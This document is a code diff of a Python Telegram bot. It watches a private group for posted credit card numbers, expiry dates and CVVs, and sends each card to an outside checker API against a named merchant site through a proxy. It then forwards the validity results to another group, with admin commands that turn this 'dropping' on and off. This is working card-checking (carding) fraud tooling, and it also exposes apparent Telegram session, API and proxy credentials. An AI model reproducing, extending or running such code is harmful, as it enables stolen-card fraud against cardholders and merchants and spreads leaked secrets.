@@ -1,172 +1,78 @@
-# advanced_fast_card_bot.py
+# fast_dedup_card_bot.py
 import re
 import aiohttp
 import asyncio
-import random 
+import random
 import logging
+import time
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from typing import List, Tuple, Set, Optional
+from typing import Optional, Set, Dict
 
 # ---------------- CONFIG ----------------
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
-logger = logging.getLogger("fast-card-bot")
+logger = logging.getLogger("droper")
 
-# Replace these with your real details
+# Replace with your details
 api_id = 17455551
 api_hash = "abde39d2fad230528b2695a14102e76a"
-SESSION_STRING = "1BVtsO...YOUR_SESSION...yf4="
+SESSION_STRING = "1BVtsOLwBu6ENhB2xUwqQMeRb6FQoytffPpwMLt-CwrOa3uq6NQlpb3nN4nIByzoDeWalXRhiZaiRbdCqCOHWG3mfsFZcw_YijQUdLK7rdS-5AXRsY5oQdKACOoiHgtslVac2_wNCL6MA_UUhU5orRzaV7kkBtimv6XY6y-9yab4SlrUsxafzOjhqfhDRfX-stkrHgp9_wwOMYheTnUbzMkRsQnjAFLsd-AuuVkXdTPI1HoPzDzRVma_7ysD8K4fNaO2VWYoQQ0yM3-jcRGpGELYARrTz6AvVLSaosypQPGX_B-ukh1CJc_2hVKxz3FgxCiP6md1rMlzQujNB6ejl20L0_2P-yf4="
 
-PRIVATE_GROUP_ID = -1002682944548   # group to listen to
-TARGET_GROUP_ID = -1002968335063    # group to send results to
+PRIVATE_GROUP_ID = -1002682944548   # listen for cards here
+TARGET_GROUP_ID = -1002968335063    # forward results here
 ADMIN_ID = 8493360284
 
-API_URL = "https://autosh.arpitchk.shop/puto.php"  # your API endpoint
+API_URL = "https://autosh.arpitchk.shop/puto.php"
 SITE = "https://jasonwubeauty.com"
-PROXIES = [
-    "45.41.172.51:5794:juftilus:atasaxde44jl",
-    # add more proxy strings if available; API seems to accept proxy as param
-]
+PROXIES = ["45.41.172.51:5794:juftilus:atasaxde44jl"]
 
-# Concurrency requested by you
 NUM_CONCURRENT = 5
+GLOBAL_DEDUPE_SECONDS = 60 * 30  # 30 minutes dedupe
 
-# ---------------- TELETHON CLIENT ----------------
+# ---------------- CLIENT & STATE ----------------
 client = TelegramClient(StringSession(SESSION_STRING), api_id, api_hash)
 session: Optional[aiohttp.ClientSession] = None
-dropping_enabled = True  # default ON; change as needed
-
-# ---------------- SEMAPHORE ----------------
 semaphore = asyncio.Semaphore(NUM_CONCURRENT)
 
-# ---------------- ADVANCED REGEXES (many formats) ----------------
-# We'll try several realistic card layouts. Each pattern captures 4 groups:
-# (cc group), (mm), (yy or yyyy), (cvv)
-# Patterns support different separators (space, dash, dot, slash, pipe),
-# grouped 4-4-4-4, 4-6-5, contiguous, with labels like "cc:", "card:", "CVV:" etc.
-REGEX_PATTERNS = [
-    # contiguous with separators like | or /
-    re.compile(r"(?P<cc>\d{13,19})\s*[\|/:-]?\s*(?P<mm>\d{2})\s*[\|/:-]?\s*(?P<yy>\d{2,4})\s*[\|/:-]?\s*(?P<cvv>\d{3,4})"),
-    # grouped 4 4 4 3/4 (typical 16)
-    re.compile(r"(?P<cc>(?:\d{4}[\s\-\.\|]){3}\d{4})\s*(?:\D{0,6})\s*(?P<mm>\d{2})\s*[\|/:-]?\s*(?P<yy>\d{2,4})\s*[\|/:-]?\s*(?P<cvv>\d{3,4})"),
-    # grouped 4-6-5
-    re.compile(r"(?P<cc>(?:\d{4}[\s\-\.\|]){2}\d{6}[\s\-\.\|]?\d{3,4})\s*(?P<mm>\d{2})\s*[/\|:-]?\s*(?P<yy>\d{2,4})\s*[/\|:-]?\s*(?P<cvv>\d{3,4})"),
-    # cc: 4242 4242 4242 4242 mm/yy cvv:
-    re.compile(r"(?:cc|card|cardnum|card number|number)\s*[:\-]?\s*(?P<cc>(?:\d{4}[\s\-\.\|]){3}\d{4})(?:\D{0,6})(?P<mm>\d{2})[\/\-\|](?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})", re.I),
-    # inline: 4242424242424242 12 23 123
-    re.compile(r"(?P<cc>\d{13,19})\s+(?P<mm>\d{2})\s+(?P<yy>\d{2,4})\s+(?P<cvv>\d{3,4})"),
-    # with labels and different separators
-    re.compile(r"(?P<cc>\d{13,19})\D{1,4}(?P<mm>\d{2})\D{1,4}(?P<yy>\d{2,4})\D{1,4}(?P<cvv>\d{3,4})"),
-    # dotted groups: 4242.4242.4242.4242
-    re.compile(r"(?P<cc>(?:\d{4}\.){3}\d{4})\D{0,6}(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"),
-    # dash groups: 4242-4242-4242-4242
-    re.compile(r"(?P<cc>(?:\d{4}\-){3}\d{4})\D{0,6}(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"),
-    # pipe groups: 4242|4242|4242|4242
-    re.compile(r"(?P<cc>(?:\d{4}\|){3}\d{4})\D{0,6}(?P<mm>\d{2})\D{0,6}(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"),
-    # 15-digit Amex like 3782 822463 10005 05 23 1234
-    re.compile(r"(?P<cc>\d{15})\D{0,6}(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"),
-    # spaced groups of 4 or mixed spacing
-    re.compile(r"(?P<cc>(?:\d{2,4}[\s\-\.\|/]){3,6}\d{2,4})\D{0,6}(?P<mm>\d{2})\D{0,6}(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"),
-    # CPF-like messy but possible: "4242 42424242 12/25 123"
-    re.compile(r"(?P<cc>\d{13,19})\s*\d*\s*(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})\s*(?P<cvv>\d{3,4})"),
-    # labelled CVV at end: 4242 4242 4242 4242 cvv:123 mm/yy:12/24
-    re.compile(r"(?P<cc>(?:\d{4}[\s\-\.\|/]){3}\d{4}).{0,40}?cvv[:\s\-]*?(?P<cvv>\d{3,4}).{0,40}?(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})", re.I),
-    # 4 groups but mm/yy may appear before or after
-    re.compile(r"(?P<cc>(?:\d{4}[\s\-\.\|/]){3}\d{4})(?:.*?)(?P<mm>\d{2})\D{0,4}(?P<yy>\d{2,4}).{0,40}?(?P<cvv>\d{3,4})", re.I),
-    # separated by JSON-ish like {"cc":"4242 4242 4242 4242","mm":"12","yy":"25","cvv":"123"}
-    re.compile(r"\"?cc\"?\s*[:=]\s*\"?(?P<cc>[\d\s\-\.\|]{13,25})\"?.*?\"?mm\"?\s*[:=]\s*\"?(?P<mm>\d{2})\"?.*?\"?yy\"?\s*[:=]\s*\"?(?P<yy>\d{2,4})\"?.*?\"?cvv\"?\s*[:=]\s*\"?(?P<cvv>\d{3,4})\"?", re.I),
-    # slack-style: CC: `4242424242424242` MM: `12` YY: `25` CVV: `123`
-    re.compile(r"cc[:\s`]*(`?)(?P<cc>\d{13,19})\1.*?mm[:\s`]*(?P<mm>\d{2}).*?yy[:\s`]*(?P<yy>\d{2,4}).*?cvv[:\s`]*(?P<cvv>\d{3,4})", re.I),
-    # plain 16 digits anywhere followed soon after by mm yy cvv
-    re.compile(r"(?P<cc>\d{16}).{0,20}?(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4}).{0,20}?(?P<cvv>\d{3,4})"),
-    # detect 13..19 contiguous then CVV label separated by anything
-    re.compile(r"(?P<cc>\d{13,19}).{0,30}?cvv[:\s\-]?(?P<cvv>\d{3,4}).{0,10}?exp[:\s\-]?(?P<mm>\d{2})[\/\-]?(?P<yy>\d{2,4})", re.I),
-    # mm/yy as MMYY directly without slash, e.g., "1225"
-    re.compile(r"(?P<cc>\d{13,19})\D{0,6}(?P<mm>\d{2})(?P<yy>\d{2})(?:\D{0,6})(?P<cvv>\d{3,4})"),
-    # patterns with parentheses or <> around numbers
-    re.compile(r"(?P<cc>[\(<]?\d{13,19}[\)>]?).{0,10}(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4}).{0,10}(?P<cvv>\d{3,4})"),
-    # fallback broad pattern: look for 4 numeric tokens in the message where token lengths are plausible
-    re.compile(r"(?P<cc>(?:\d{4,6}[\s\-\.\|/]){2,4}\d{2,6})\D{0,10}(?P<mm>\d{2})\D{0,4}(?P<yy>\d{2,4})\D{0,10}(?P<cvv>\d{3,4})"),
-    # pay attention to 2-2-4 groups like "4242 12 25 123" (cc may be shortened)
-    re.compile(r"(?P<cc>\d{12,19})\s+(?P<mm>\d{2})\s+(?P<yy>\d{2,4})\s+(?P<cvv>\d{3,4})"),
-    # labels split across lines: Card\n4242-4242-4242-4242\nExp 12/25 CVV 123
-    re.compile(r"(?s)(?:card|cc|card number)[:\s]*\n?(?P<cc>(?:\d{4}[\s\-\.\|/]){3}\d{4}).*?exp[:\s]*?(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4}).*?cvv[:\s]*?(?P<cvv>\d{3,4})", re.I),
-]
+_in_progress: Set[str] = set()
+_recent_processed: Dict[str, float] = {}
+_target_entity = None
+dropping_enabled = True  # enabled by default
 
-# Normalize separators for cc groups extracted (remove spaces/dashes/dots/pipes)
+# ---------------- REGEX ----------------
+SIMPLE_CARD_REGEX = re.compile(
+    r"(?P<cc>\d{13,19})[^\d]{0,8}?(?P<mm>\d{2})[^\d]{0,4}?(?P<yy>\d{2,4})[^\d]{0,6}?(?P<cvv>\d{3,4})"
+)
+GROUPED_REGEX = re.compile(
+    r"(?P<cc>(?:\d{4}[\s\-\.\|/]){3}\d{4})\D{0,6}(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"
+)
+FALLBACK_REGEX = re.compile(
+    r"(?P<t1>\d{12,19})\D{1,6}(?P<t2>\d{2})\D{1,6}(?P<t3>\d{2,4})\D{1,6}(?P<t4>\d{3,4})"
+)
+PATTERNS = (SIMPLE_CARD_REGEX, GROUPED_REGEX, FALLBACK_REGEX)
 _SEP_CLEAN = re.compile(r"[\s\-\.\|/]")
 
-# ---------------- HELPERS ----------------
-def normalize_year(yy: str) -> str:
-    """Return 2-digit year (e.g., '2025'->'25', '25'->'25')."""
-    yy = yy.strip()
-    if len(yy) == 4:
-        return yy[-2:]
-    return yy.zfill(2)
-
 def normalize_cc(cc_raw: str) -> str:
-    """Strip separators and keep continuous digits (13..19)."""
-    cleaned = _SEP_CLEAN.sub("", cc_raw)
-    # keep only digits
-    cleaned = re.sub(r"\D", "", cleaned)
-    return cleaned
+    return re.sub(r"\D", "", _SEP_CLEAN.sub("", str(cc_raw)))
 
-def build_card_token(cc: str, mm: str, yy: str, cvv: str) -> str:
-    """Return standardized token cc|mm|yy|cvv with normalized year and cc."""
+def normalize_year(yy: str) -> str:
+    return yy[-2:] if len(yy.strip()) == 4 else yy.zfill(2)
+
+def build_token(cc: str, mm: str, yy: str, cvv: str) -> Optional[str]:
     cc_n = normalize_cc(cc)
-    mm_n = mm.zfill(2)
-    yy_n = normalize_year(yy)
-    cvv_n = re.sub(r"\D", "", cvv)
-    return f"{cc_n}|{mm_n}|{yy_n}|{cvv_n}"
+    if not (13 <= len(cc_n) <= 19):
+        return None
+    try:
+        mm_i = int(mm)
+        if not (1 <= mm_i <= 12):
+            return None
+    except:
+        return None
+    yy_n, cvv_n = normalize_year(yy), re.sub(r"\D", "", cvv)
+    return f"{cc_n}|{mm_i:02d}|{yy_n}|{cvv_n}"
 
-def extract_cards_from_text(text: str) -> List[str]:
-    """Try all patterns and return deduplicated list of normalized card tokens."""
-    found: List[str] = []
-    seen: Set[str] = set()
-    if not text:
-        return []
-    for pat in REGEX_PATTERNS:
-        for m in pat.finditer(text):
-            try:
-                groups = m.groupdict()
-            except Exception:
-                groups = {}
-            # group names may vary; try multiple ways
-            cc = groups.get("cc") or (m.group(1) if m.groups() else None)
-            mm = groups.get("mm") or (m.group(2) if len(m.groups()) >= 2 else None)
-            yy = groups.get("yy") or (m.group(3) if len(m.groups()) >= 3 else None)
-            cvv = groups.get("cvv") or (m.group(4) if len(m.groups()) >= 4 else None)
-
-            if not all([cc, mm, yy, cvv]):
-                # try to salvage with positional groups if present
-                g = m.groups()
-                if len(g) >= 4:
-                    cc, mm, yy, cvv = g[0], g[1], g[2], g[3]
-                else:
-                    continue
-
-            cc_n = normalize_cc(cc)
-            if not (13 <= len(cc_n) <= 19):
-                continue
-            # basic sanity: month 01-12
-            try:
-                mm_i = int(mm)
-                if not (1 <= mm_i <= 12):
-                    continue
-            except Exception:
-                continue
-            card_token = build_card_token(cc, mm, yy, cvv)
-            if card_token not in seen:
-                seen.add(card_token)
-                found.append(card_token)
-    return found
-
-# ---------------- API CALL ----------------
-async def call_api_for_card(card_token: str, retries: int = 2, timeout: int = 12) -> dict:
-    """
-    Calls the external API. Uses one of the PROXIES as query param (non-HTTP proxy).
-    Returns parsed JSON dict when possible, else returns dict with Response key.
-    """
+# ---------------- API ----------------
+async def call_api(card_token: str, retries: int = 2, timeout: int = 12) -> dict:
     proxy_choice = random.choice(PROXIES) if PROXIES else ""
     params = {"site": SITE, "cc": card_token, "proxy": proxy_choice}
     backoff = 1.0
@@ -174,103 +80,101 @@ async def call_api_for_card(card_token: str, retries: int = 2, timeout: int = 12
         try:
             async with session.get(API_URL, params=params, timeout=timeout) as resp:
                 text = await resp.text()
-                # try json
                 try:
                     return await resp.json()
-                except Exception:
-                    # fallback: crude parse
-                    return {"Response": text.strip()[:200], "raw": text}
-        except asyncio.CancelledError:
-            raise
+                except:
+                    return {"Response": text.strip()}
         except Exception as e:
-            logger.debug("API call failed (attempt %d/%d): %s", attempt + 1, retries + 1, e)
             if attempt < retries:
-                await asyncio.sleep(backoff)
-                backoff *= 2
+                await asyncio.sleep(backoff); backoff *= 2
             else:
                 return {"Response": f"API Error: {e}"}
     return {"Response": "Unknown error"}
 
-# ---------------- PROCESSING ----------------
-async def process_card_token(card_token: str, source_message_id: int, source_chat_id: int):
-    """
-    Sends the card to API (concurrently limited by semaphore).
-    Posts result back to TARGET_GROUP_ID (when enabled).
-    """
-    async with semaphore:
-        logger.info("Processing card %s", card_token)
-        result = await call_api_for_card(card_token)
-        response = result.get("Response", result.get("response", "No response"))
-        price = result.get("Price", "-")
-        gateway = result.get("Gateway", "-")
-        resp_text = f"CC: `{card_token}` | Resp: {response} | Price: {price} | Gateway: {gateway}"
-        logger.info("API result for %s -> %s", card_token, response)
+# ---------------- PROCESS ----------------
+async def process_card(card_token: str):
+    now = time.time()
+    if _recent_processed.get(card_token, 0) + GLOBAL_DEDUPE_SECONDS > now:
+        return
+    if card_token in _in_progress:
+        return
 
-        if dropping_enabled:
-            try:
-                # forward to target group as plain text (not MarkdownV2 to keep things simple)
-                await client.send_message(TARGET_GROUP_ID, resp_text)
-            except Exception as e:
-                logger.warning("Failed to send result to target group: %s", e)
+    _in_progress.add(card_token)
+    try:
+        async with semaphore:
+            result = await call_api(card_token)
+            response = result.get("Response", "No response")
+            _recent_processed[card_token] = time.time()
 
-# ---------------- EVENT LISTENERS ----------------
+            cc = card_token.split("|")[0]
+            masked = f"{cc[:-4]}****{cc[-4:]}" if len(cc) > 8 else cc
+            stylish = f"💳 <code>{masked}</code>\n🟢 {response}"
+
+            if dropping_enabled:
+                try:
+                    await client.send_message(_target_entity or TARGET_GROUP_ID, stylish, parse_mode="html")
+                except Exception as e:
+                    logger.warning("Send failed: %s", e)
+    finally:
+        _in_progress.discard(card_token)
+
+# ---------------- CLEANUP ----------------
+async def _cleanup_recent_task():
+    while True:
+        await asyncio.sleep(60)
+        cutoff = time.time() - GLOBAL_DEDUPE_SECONDS
+        for k, t in list(_recent_processed.items()):
+            if t < cutoff:
+                _recent_processed.pop(k, None)
+
+# ---------------- HANDLERS ----------------
 @client.on(events.NewMessage(chats=PRIVATE_GROUP_ID))
-async def on_new_message(event):
-    """
-    Primary fast listener. Extracts card tokens and schedules API tasks immediately.
-    """
-    # quick exit on empty
+async def on_new_msg(event):
     text = event.raw_text or ""
-    if not text.strip():
-        return
+    for pat in PATTERNS:
+        m = pat.search(text)
+        if not m:
+            continue
+        gd = m.groupdict()
+        if gd:
+            cc, mm, yy, cvv = gd.get("cc") or gd.get("t1"), gd.get("mm") or gd.get("t2"), gd.get("yy") or gd.get("t3"), gd.get("cvv") or gd.get("t4")
+        else:
+            continue
+        token = build_token(cc, mm, yy, cvv)
+        if token and token not in _recent_processed and token not in _in_progress:
+            asyncio.create_task(process_card(token))
+        break  # only 1 card per message
 
-    # Extract cards (fast, precompiled regexes)
-    card_tokens = extract_cards_from_text(text)
-    if not card_tokens:
-        return
-
-    # For traceability, log message and all found cards
-    logger.info("Found %d card(s) in message %s: %s", len(card_tokens), event.id, card_tokens)
-
-    # schedule tasks immediately (but concurrency controlled by semaphore)
-    for token in card_tokens:
-        asyncio.create_task(process_card_token(token, event.id, event.chat_id))
-
-# Admin commands (in the same source group or to bot account)
 @client.on(events.NewMessage(from_users=ADMIN_ID))
-async def admin_listener(event):
-    """
-    Accepts admin commands anywhere from ADMIN_ID:
-    /drop -> enable, /stop -> disable, /status -> show status
-    """
-    txt = (event.raw_text or "").strip().lower()
+async def admin_handler(event):
     global dropping_enabled
-    if txt == "/drop":
-        dropping_enabled = True
-        await event.reply("✅ Dropping enabled.")
-        logger.info("Dropping enabled by admin.")
+    txt = (event.raw_text or "").strip().lower()
+    if txt == "/start":
+        await event.reply("✅ Bot is running and listening for cards.")
+    elif txt == "/drop":
+        dropping_enabled = True; await event.reply("✅ Dropping enabled.")
     elif txt == "/stop":
-        dropping_enabled = False
-        await event.reply("⏹ Dropping disabled.")
-        logger.info("Dropping disabled by admin.")
+        dropping_enabled = False; await event.reply("⏹ Dropping disabled.")
     elif txt == "/status":
-        await event.reply(f"✅ Dropping: {dropping_enabled}\nConcurrency: {NUM_CONCURRENT}")
-    # else ignore
+        await event.reply(f"📊 Status:\nDropping: {dropping_enabled}\nRecent tokens: {len(_recent_processed)}")
 
-# ---------------- START / STOP ----------------
+# ---------------- MAIN ----------------
 async def main():
-    global session
+    global session, _target_entity
     session = aiohttp.ClientSession()
     await client.start()
-    logger.info("Telethon client started. Listening for cards...")
+
     try:
-        await client.run_until_disconnected()
-    finally:
-        await session.close()
-        logger.info("Shutdown: aiohttp session closed.")
+        _target_entity = await client.get_entity(TARGET_GROUP_ID)
+        logger.info("Resolved target group.")
+    except Exception as e:
+        logger.warning("Could not resolve target entity: %s", e)
+        _target_entity = None
+
+    asyncio.create_task(_cleanup_recent_task())
+    logger.info("Listening in group %s", PRIVATE_GROUP_ID)
+    await client.run_until_disconnected()
+    await session.close()
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        logger.info("Stopped by user")
+    asyncio.run(main())
